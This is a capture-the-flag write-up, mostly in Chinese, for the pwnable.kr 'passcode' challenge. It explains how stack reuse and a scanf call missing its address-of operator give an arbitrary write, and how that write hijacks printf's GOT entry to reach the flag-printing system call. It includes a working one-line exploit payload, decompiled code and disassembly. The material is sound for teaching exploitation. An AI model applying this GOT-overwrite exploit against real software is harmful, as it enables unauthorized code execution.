## TARGET
```
passcode - 10 pt [writeup] 

Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```
## WRITEUP
download:
```scp -P 2222 -p  passcode@pwnable.kr:/home/passcode/* ./```

漏洞信息：   
程序main函数中，welcome和login存在栈复用，welcome调用gets向ebp-0x70读入100个字符。    
login中scanf没有取地址，因此会把[ebp-10h]和[ebp-0xch]的内容当成要写入的地址。 

在welcome中，我们有一次布置数据的机会，可以造成信息泄漏、布置dirty data。  
在login中，我们可以两次任意地址写，每次写4byte。  
如果想进入system流程，需要修改[ebp-0x10]和[ebp-0xc]的内容。由于没有栈地址，在welcome中泄漏出数据之后就不能布置dirty data了。因此，考虑利用任意地址写来hijack GOT为.text中system的地址，首先需要在welcome布置[ebp-0x10]为printf GOT地址。  

scanf format %100s可以读取100 byte，正好0x60*"A"+PRINTF_GOT_ADDR也是100 byte。多的输入正好给了login中的scanf %d，也就是向GOT表中写入的值。

EXP:  
python -c "print 'A'*0x60 + '\x00\xa0\x04\x08' + '134514147'" | ./passcode

```c
unsigned int welcome()
{
  char v1; // [esp+18h] [ebp-70h]
  unsigned int v2; // [esp+7Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("enter you name : ");
  __isoc99_scanf("%100s", &v1);
  printf("Welcome %s!\n", &v1);
  return __readgsdword(0x14u) ^ v2;
}

int login()
{
  int v1; // [esp+18h] [ebp-10h]
  int v2; // [esp+1Ch] [ebp-Ch]

  printf("enter passcode1 : ");
  __isoc99_scanf("%d");
  fflush(stdin);
  printf("enter passcode2 : ");
  __isoc99_scanf("%d");
  puts("checking...");
  if ( v1 != 338150 || v2 != 13371337 )
  {
    puts("Login Failed!");
    exit(0);
  }
  puts("Login OK!");
  return system("/bin/cat flag");
}
```

```asm
.text:08048564 ; __unwind {
.text:08048564                 push    ebp
.text:08048565                 mov     ebp, esp
.text:08048567                 sub     esp, 28h
.text:0804856A                 mov     eax, offset format ; "enter passcode1 : "
.text:0804856F                 mov     [esp], eax      ; format
.text:08048572                 call    _printf
.text:08048577                 mov     eax, offset aD  ; "%d"
.text:0804857C                 mov     edx, [ebp+var_10]
.text:0804857F                 mov     [esp+4], edx
.text:08048583                 mov     [esp], eax
.text:08048586                 call    ___isoc99_scanf
.text:0804858B                 mov     eax, ds:stdin@@GLIBC_2_0
.text:08048590                 mov     [esp], eax      ; stream
.text:08048593                 call    _fflush
.text:08048598                 mov     eax, offset aEnterPasscode2 ; "enter passcode2 : "
.text:0804859D                 mov     [esp], eax      ; format
.text:080485A0                 call    _printf
.text:080485A5                 mov     eax, offset aD  ; "%d"
.text:080485AA                 mov     edx, [ebp+var_C]
.text:080485AD                 mov     [esp+4], edx
.text:080485B1                 mov     [esp], eax
.text:080485B4                 call    ___isoc99_scanf
```
## flag
Sorry mom.. I got confused about scanf usage :(

## TIPS
scanf 会将format和输入的字符进行匹配，如果不匹配，格式化操作不会生效。例如：scanf("input%d",&a);输入为input123，123才会写入a中。

举例:地址不可写时赋值失败
```asm
 ► 0xf7e53bc7 <_IO_vfscanf+15271>    mov    dword ptr [edx], eax <0xf7e60cab>
   0xf7e53bc9 <_IO_vfscanf+15273>    jmp    _IO_vfscanf+4719 <0xf7e5128f>
    ↓
   0xf7e5128f <_IO_vfscanf+4719>     add    dword ptr [ebp - 0x588], 1
   0xf7e51296 <_IO_vfscanf+4726>     mov    dword ptr [ebp - 0x570], 0
   0xf7e512a0 <_IO_vfscanf+4736>     jmp    _IO_vfscanf+760 <0xf7e50318>
```
